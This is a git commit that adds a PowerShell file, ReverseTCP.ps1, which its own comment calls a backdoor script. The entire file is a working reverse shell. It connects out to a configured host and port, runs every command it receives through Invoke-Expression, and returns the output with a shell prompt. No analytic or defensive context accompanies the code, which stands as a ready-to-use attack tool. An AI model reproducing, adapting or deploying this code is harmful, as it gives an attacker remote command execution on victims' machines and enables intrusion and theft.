17de33b7c95bad62bff2129d80be394c55acf87a
jacarni <67039652+jacarni@users.noreply.github.com>
2020-06-17 21:30:07 -0400

    Create ReverseTCP.ps1

---
+++ ReverseTCP.ps1
@@ -0,0 +1,14 @@
+#ReserverTCP Backdoor Script
+
+$Rip='10.0.0.10'
+$Rport='8000'
+
+$client = New-Object System.Net.Sockets.TCPClient("$Rip",$Rport);
+$stream = $client.GetStream();
+[byte[]]$bytes = 0..255|%{0};
+while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;
+$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
+$sendback = (iex $data 2>&1 | Out-String );
+$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
+$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};
+$client.Close()
